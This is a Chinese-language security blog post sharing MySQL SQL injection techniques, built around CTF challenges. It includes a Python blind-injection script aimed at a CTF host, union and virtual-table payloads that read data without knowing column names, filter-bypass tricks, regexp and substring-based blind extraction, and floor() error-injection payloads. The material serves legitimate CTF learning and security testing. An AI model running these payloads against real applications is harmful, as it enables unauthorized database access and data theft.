> 原文链接: https://www.anquanke.com//post/id/86622 


# 【技术分享】SQL注入的一些技巧分享


                                阅读量   
                                **124736**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



[![](https://p3.ssl.qhimg.com/t01bcc32910a8bfe013.jpg)](https://p3.ssl.qhimg.com/t01bcc32910a8bfe013.jpg)



作者：[米糕菌](http://bobao.360.cn/member/contribute?uid=2559191552)

预估稿费：300RMB

投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿



先上一道简单的ctf注入题：

**一道利用order by进行注入的ctf题**

****

很不错的一道利用order by的注入题，之前不知道order by除了爆字段还有这种操作。

原题地址：[http://chall.tasteless.eu/level1/index.php?dir=](http://chall.tasteless.eu/level1/index.php?dir=)

直接进去dir后的参数是ASC，网页上有从1~10编号的10条信息。绕了一大圈反应出是order by后的参数，尝试把参数改为DESC，果然倒序排列了。题目给了提示：**hint: table level1_flag column flag**给了数据表和字段，于是开始构造payload。

于是玄学来了，在order by后面插入管道符|之后再跟一个偶数（？这里我真的不清楚）会导致排序错乱。尝试以下url：

[http://chall.tasteless.eu/level1/index.php?dir=|2](http://chall.tasteless.eu/level1/index.php?dir=%7C2)

果然排序错乱，那么想要查出flag必定要使用以下语句：

```
select flag from level1_flag
```

（结果证明确实这是一个一行一列的玩意儿，不然就要使用到**limit**或**group_concat**）

但是网页上没有显示这个的输出框，于是我们这样利用这个查询的结果集：

```
|(select(select flag from level1_flag)regexp '正则')+1
```

解释一下，括号里的正则匹配成功返回1，所以再加1变成2

所以如果匹配成功，网页的排序就会错乱，如果不成功排序则不会错乱，于是最终脚本：



```
import urllib
import requests
result_string="^"
right_url="http://chall.tasteless.eu/level1/index.php?dir=|(select(select flag from level1_flag limit 0,1) regexp 'sdfghj')%2b1"
ordered_content=requests.get(right_url).content
while(1):
    for letter in '1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM?':
        if(letter=='?'):
            exit()
        result_string_tem=result_string+letter
        url="http://chall.tasteless.eu/level1/index.php?dir=|(select(select flag from level1_flag limit 0,1) regexp "+"'"+result_string_tem+"'"+")%2b1"
        print url
        content=requests.get(url).content
        if(content!=ordered_content):
            result_string=result_string_tem
            print result_string
            break
        continue
```

总结一下：

1、管道符的使用（见正文）

2、regexp的使用（见正文）

其实还有一个**group by**后面的注入，**where**后面的都能用

<br>

**0x00   union、intersect和minus的使用**

****

union基本语法：



```
select语句
union select语句
```

intersect（交集）和minus（差集）也一样，但是mysql不支持交集和差集，**所以这也是一个判断数据库的方法**。

就说说union：

基本法：前后两个select语句的字段数要相同，不然sql必定报错，所以可以用union指令判断数据表的字段数，基本构造方法：

```
...where...union select 1,2,3,4,...,x limit y,z
```

其中where子句可以没有，limit视情况而定，中间输入进去的1,2,3,4,…,x他们中的任何一个都可以用函数代替，最终他们在默认排序的情况下会被拼接到结果集的最后一行。例：



```
mysql&gt; select * from learning_test union select 1,version(),concat('sh','it'),4,5;
+------+---------+---------+---------+----------------------+
| num  | column2 | column3 | column4 | bin_column           |
+------+---------+---------+---------+----------------------+
|    1 | a       | s       | s       | aaaaaaaa             |
|    2 | b       | s       | s       | ddd                  |
|    3 | c       | s       | s       | wwwwwwww             |
|    4 | d       | s       | s       | fffffff              |
|    1 | 5.5.53  | shit    | 4       | 5                    |
+------+---------+---------+---------+----------------------+
5 rows in set (0.03 sec)
```

union查询强大而灵活，因为他可以查询两个不同的表的信息，哪怕这两个表字段数不同，只要这样做：



```
mysql&gt; select * from learning_test union select 1,version(),3,group_concat(test_table),5 from test_table;
+------+---------+---------+---------+----------------------+
| num  | column2 | column3 | column4 | bin_column           |
+------+---------+---------+---------+----------------------+
|    1 | a       | s       | s       | aaaaaaaa             |
|    2 | b       | s       | s       | ddd                  |
|    3 | c       | s       | s       | wwwwwwww             |
|    4 | d       | s       | s       | fffffff              |
|    1 | 5.5.53  | 3       | 1,2,3   | 5                    |
+------+---------+---------+---------+----------------------+
5 rows in set (0.03 sec)
```

而test_table内的数据结构是这样的：



```
+------------+
| test_table |
+------------+
| 1       |
| 2       |
| 3       |
+------------+
```

很明显与learning_test表的字段数不同，但是我们使用了**group_concat()**函数拼接了我们需要的内容。

<br>

**0x01   管道符的使用**

****

1、order by之后可以使用|数字使排序错乱，不清楚具体是怎么错乱的

2、where子句之后跟上|1或|0也能出数据，但要是跟上|大于一或小于零的数就出不了数据

<br>

**0x02   regexp的使用**

****

很简单，正则匹配，匹配对象必须是单行单列，或者说是字符串。基本语法：

```
select (select语句) regexp '正则'
```

意思是将括号内的查询的结果集尝试与给出的正则匹配，如果配对成功则返回1，配对失败返回0。

<br>

**0x03   group_concat()的使用**

****

将一列数据进行拼接，非常便利的函数,一般与union一起使用，就像本节的第一小节给出的最后一个例子一样。

<br>

**0x04   利用虚拟表在不知道字段名的情况下出数据**

****

先上一道ctf题的payload进行分析：



```
-1 UNION ALL 
SELECT * FROM (
    (SELECT 1)a JOIN (
        SELECT F.4 from (
            SELECT * FROM (SELECT 1)u JOIN (SELECT 2)i JOIN (SELECT 3)o JOIN (SELECT 4)r 
            UNION 
            SELECT * FROM NEWS LIMIT 1 OFFSET 4
        )F
    )b 
JOIN (SELECT 3)c JOIN (SELECT 4)d
)
```

正常版：

```
-1 UNION ALL SELECT * FROM ((SELECT 1)a JOIN (SELECT F.4 from (SELECT * FROM (SELECT 1)u JOIN (SELECT 2)i JOIN (SELECT 3)o JOIN (SELECT 4)r UNION SELECT * FROM NEWS LIMIT 1 OFFSET 4)F)b JOIN (SELECT 3)c JOIN (SELECT 4)d)
```

这本是一道ctf题，前面估计是where后面的子句。这道题过滤了三样东西：1、空格，2、逗号，3、字段名

这里不详细说绕过，方法很多，空格利用%0a绕过，union指令中的逗号利用join绕过，limit指令中的逗号利用offset绕过。

这里因为payload中不能出现字段名，因此我们创建了一个与所查表字段数相同的虚拟表并对其并将其查询结果与前面的查询union起来。具体来说是这样：

— 比如说在原查询的第二字段处出数据



```
... where ... 
union all
select * from(
    (select 1)a join(
        select F.[需要查询的字段号] from(
            select * from [需要查询的表有多少个字段就join多少个]
            union
            select * from [需要查询的表] [limit子句]
        )F-- 我们创建的虚拟表没有表名，因此定义一个别名，然后直接[别名].[字段号]查询数据
    )b-- 同上[还差多少字段就再join多少个，以满足字段数相同的原则]
)
```



正常版：

```
... where ... union all select * from((select 1)a join(select F.[需要查询的字段号] from(select * from [需要查询的表有多少个字段就join多少个] union select * from [需要查询的表] [limit子句])F)b[还差多少字段就再join多少个，以满足字段数相同的原则])
```

payload中的join换成逗号亦可。

我们平时使用union时都是将**union select 1,2,3,4…**写在后面以填充不存在的数据并测试字段数。在这种操作中我们把**union select 1,2,3,4…**写在了前面来充当虚拟表的字段名。本质上来说并不是不知道字段名，而是把不知道字段名的表的查询结果和我们创建的字段名为1,2,3,4…的虚拟表的交集作为一个结果集返回。

这里有一个点，方括号内的limit子句需要特别注意，要取下面这个子查询↓

```
select F.[需要查询的字段号] from(select * from [需要查询的表有多少个字段就join多少个] union select * from [需要查询的表] [limit子句]
```

结果集的最后一行，因为我们需要的数据被union拼到了最后一行（在我们需要的数据只有一行的情况下）。

如果我们需要的东西不止一行会怎么样呢？一段简单的测试：



```
mysql&gt; select * from learning_test union all SELECT * FROM ((SELECT 1)a JOIN (SELECT F.1 from (SELECT * FROM (SELECT 1)u UNION SELECT * FROM test_table LIMIT 2 OFFSET 1)F)b JOIN (SELECT 3)c JOIN (SELECT 4)d JOIN (select 5)e);
+------+---------+---------+---------+-------------+
| num  | column2 | column3 | column4 | bin_column  |
+------+---------+---------+---------+-------------+
|    1 | a       | s       | s       | aaaaaaaaa   |
|    2 | b       | s       | s       | dddd        |
|    3 | c       | s       | s       | wwwwwwww    |
|    4 | d       | s       | s       | ffffffff    |
|    1 | 2       | 3       | 4       | 5           |
|    1 | 3       | 3       | 4       | 5           |
+------+---------+---------+---------+-------------+
6 rows in set (0.00 sec)
```

并不会报错，我们需要的查询结果就是第5，6行第2字段的2和3。

下面是对虚拟表的简单测试：



```
mysql&gt; select * from ((select 1)a join (select 2)b) limit 1 offset 1;
Empty set (0.00 sec)
mysql&gt; select * from ((select 1)a join (select 2)b);
+---+---+
| 1 | 2 |
+---+---+
| 1 | 2 |
+---+---+
1 row in set (0.00 sec)
```

可以看到我们创建的确实是字段名为1和2的虚拟表，此表的结构为一行两列。

用虚拟表去union其他表的数据：



```
mysql&gt; select * from ((select 233)a,(select 2333)b,(select 23333)c,(select 233333)d,(select 2333333)e) union select * from learning_test;
+------+------+-------+--------+-------------+
| 233  | 2333 | 23333 | 233333 | 2333333     |
+------+------+-------+--------+-------------+
|  233 | 2333 | 23333 | 233333 | 2333333     |
|    1 | a    | s     | s      | aaaaaaaa    |
|    2 | b    | s     | s      | ddd         |
|    3 | c    | s     | s      | wwwwwwww    |
|    4 | d    | s     | s      | fffffff     |
+------+------+-------+--------+-------------+
5 rows in set (0.00 sec)
```

表明我们之前的分析是正确的，方法可行。

<br>

**0x05   substring()和ascii()的联合使用**

****

用于猜解数据库名、表名、字段名和查询结果等

具体使用：



```
mysql&gt; select ascii((select substring((select bin_column from learning_test where num=2),1,1)))&gt;10;
+--------------------------------------------------------------------------------------+
| ascii((select substring((select bin_column from learning_test where num=2),1,1)))&gt;10 |
+--------------------------------------------------------------------------------------+
|                                                                                    1 |
+--------------------------------------------------------------------------------------+
1 row in set (0.02 sec)
```

看到返回了1，也就是说select bin_column from learning_test where num=2这个查询语句返回的结果集的第一个字符的ascii码确实是大于10的。当然这个过程是繁琐的，可以使用脚本进行自动化猜解，或使用sqlmap中集成的类似的自动化注入功能。

<br>

**0x06   利用floor()报错注入**

****

**payload：**

```
...and (select count(*),concat(version(),floor(rand(0)*8))x from information_schema.tables group by x)a;
```

或

```
...and (select count(*) from (select 1 union select null union select !1)x group by concat(version(),floor(rand(0)*2)))
```


